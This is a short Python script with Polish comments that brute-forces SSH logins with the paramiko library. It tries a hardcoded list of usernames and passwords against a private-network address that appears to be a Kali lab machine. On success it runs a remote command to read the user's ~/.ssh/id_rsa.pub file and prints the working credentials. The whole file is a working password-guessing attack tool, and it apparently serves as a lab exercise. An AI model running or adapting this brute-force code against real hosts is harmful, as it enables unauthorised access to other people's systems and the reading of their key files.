import paramiko
# Instrukcja TODO:
# paramiko.ssh_exception.SSHException: pojawia się jeśli SSH wyłapie
# zbyt dużą ilość niepoprawnych logowań

# Settings.
targetIP = "192.168.100.49"
targetPort = 22
username = "kali"
password = "kali"
USERS = ['user', "misiek", "rysiek", "zdzisiek", "lesio", "czesio", "misio", "pysio", "kali"]
PASSWORDS = ["dupa", "misiek", 'kali']
MAX_USERS = len(USERS)
MAX_PASSWORDS = len(PASSWORDS)
iteration_users = -1
iteration_passwords = -1

# SSH initialization
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.load_system_host_keys()
ssh.load_system_host_keys()

loggedIn = False
for USER in USERS:
    print(f"Cracking user: {USER}")
    for PASSWORD in PASSWORDS:
        try:
            print(f" - trying password: {PASSWORD}", end="")
            ssh.connect(targetIP, targetPort, USER, PASSWORD,timeout=1)
            loggedIn = True
            print(" - OK.")
            break
        except:
            print(" - FAILED.")
            loggedIn = False
    if loggedIn == True:
        break



if loggedIn:
    command = "cat ~/.ssh/id_rsa.pub "
    print(f"Executing command: {command}")
    stdin, stdout, stderr = ssh.exec_command(command)
    wynik = stdout.read().decode()
    print(f"Result: {wynik}")

    # lista = wynik.split("\n")
    # for line in wynik:
    #     print("Linia: " + str(line), end="")
    #     #pass

if loggedIn:
    print(f"Login succeeded, user: {USER}, password: {PASSWORD}.")
else:
    print(f"Login failed, last login attempt with credentials user: {USER}, password: {PASSWORD}.")